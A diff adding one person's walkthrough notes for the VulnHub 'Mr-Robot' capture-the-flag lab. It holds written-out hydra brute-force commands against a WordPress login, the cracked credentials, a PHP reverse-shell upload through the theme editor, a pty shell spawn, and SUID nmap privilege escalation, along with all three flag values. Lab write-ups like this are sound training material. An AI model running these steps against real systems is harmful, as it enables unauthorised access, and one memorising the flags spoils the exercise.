@@ -1,0 +1,106 @@
+https://www.vulnhub.com/entry/mr-robot-1,151/
+Find 3 flags
+
+IP Address: 192.168.83.115
+Ports: 
+22 ssh (closed)
+80 http
+443 https
+
+Keys (3)
+1) 073403c8a58a1f80d943455fb30724b9
+2) 822c73956184f694993bede3eb39f959
+3) 04787ddef27c3dee1ee161b21670b4e4
+
+USERS
+elliot :: ER28-0652
+robot :: abcdefghijklmnopqrstuvwxyz
+
+
+Dirbuster
+/blog (forbidden)
+/login (redirects to /wp-login.php)
+/0 (user's Blog) (potential user name?)
+/admin (nothing, looks like homepage)
+
+/robots.txt 
+  fsocity.dic (wordlist for this CTF, I assume) DUPLICATES (sort fsocity.dic) (new list sort fsocity | uniq > fsociety_unique.dic)
+  key-1-of-3.txt (flag, I assume)
+
+
+WPSCAN
+no usernames, vuln plugins ...
+
+HYDRA (wordpress)
+try to brute force wordpress login
+failed login shows ERROR: Invalid username
+
+need login
+
+log=userlogin
+pwd=passwordlogin
+wp-submit=Log+In
+redirect_to=http://192.168.83.115/wp-admin/
+testcookie=1
+
+hydra -L fsocity_unique.dic -p testpass 192.168.83.115 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+gives username(s): elliot, (Elliot, ELLIOT)
+
+failed login shows ERROR: The password you ...
+
+hydra -l elliot -P fsocity_unique.dic 192.168.83.115 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you'
+gives password: ER28-0652
+
+
+HTTP
+gives command options 'prepare', 'fsociety', 'inform', 'question', 'wakeup', 'join'
+
+prepare: shows video, shows link "www.whoismrrobot.com" >> looks like NBC website probably not part of this CTF
+fsociety: shows video, are you ready to join fsociety?
+inform: newspaper clippings, propaganda
+question: propaganda
+wakeup: video (i don't have volume, try again later)
+join: prompt to enter email (checked email, have not received anything yet)
+
+
+
+Wordpress admin page
+elliot :: ER28-0652
+
+users
+elliot > Elliot Alderson > elliot@mrrobot.com > Administrator
+mich05654 > krista Gordon > kgordon@therapist.com > Subscriber
+
+try to upload shell
+cannot "sorry file not permitted for security reasons"
+
+metasploit
+error uploading
+
+upload reverse shell php to 404 php (Appearance editor)
+
+connect with nc
+run python -c 'import pty; pty.spawn("/bin/sh")' to get shell
+
+/home/robot
+key-2-of-3.txt (root only)
+password.raw-md5 (robot:c3fcd3d76192e4007dfb496cca67e13b)
+use online hash cracker  >>  abcdefghijklmnopqrstuvwxyz
+read key-2-of-3.txt
+
+
+had to look up for this
+look for files with SUID 4
+  find / -perm -4000 2>/dev/null
+
+shows that nmap can be used
+nmap --interactive
+ !sh
+
+gives us root
+
+/root
+  key-3-of-3.txt
+
+
+
